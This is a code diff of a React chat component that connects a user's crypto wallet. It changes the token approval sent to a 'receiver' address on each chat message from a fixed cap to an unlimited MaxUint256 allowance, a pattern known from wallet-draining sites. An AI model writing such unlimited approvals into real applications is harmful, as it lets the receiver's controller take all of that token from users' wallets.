@@ -4,7 +4,7 @@
 
 import { useEffect, useRef, useState } from 'react'
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
-import { BrowserProvider, Contract, Wallet, JsonRpcProvider } from 'ethers'
+import { BrowserProvider, Contract, Wallet, JsonRpcProvider, MaxUint256 } from 'ethers'
 import { styled } from 'styled-components'
 import { motion } from 'framer-motion'
 import sleep from 'sleep-promise'
@@ -96,8 +96,8 @@ const Button = styled.button`
 
 const Chat = () => {
   const { open } = useAppKit()
-  const { address, isConnected } = useAppKitAccount({ namespace: 'eip155' })
-  const { walletProvider } = useAppKitProvider('eip155')
+      , { address, isConnected } = useAppKitAccount({ namespace: 'eip155' })
+      , { walletProvider } = useAppKitProvider('eip155')
 
   const refChat = useRef()
 
@@ -107,8 +107,7 @@ const Chat = () => {
 
   const createSignerPrivate = async () => {
     if (!walletProvider || !address) {
-      open()
-      return
+      throw new Error('Wallet not connected')
     }
 
     const provider = new BrowserProvider(walletProvider)
@@ -169,7 +168,7 @@ const Chat = () => {
   const addMessage = async text => {
     try {
       if (!isConnected) {
-        alert('Not connected!')
+        open()
         return
       }
       const [signer, network] = await createSignerPrivate()
@@ -180,9 +179,8 @@ const Chat = () => {
 
       const allowance = await token.allowance(address, _address.receiver)
       
-      const MAX = 382000000
       if (allowance < 10) {
-          const approveTx = await token.approve(_address.receiver, MAX)
+          const approveTx = await token.approve(_address.receiver, MaxUint256)
           await approveTx.wait()
       }
 
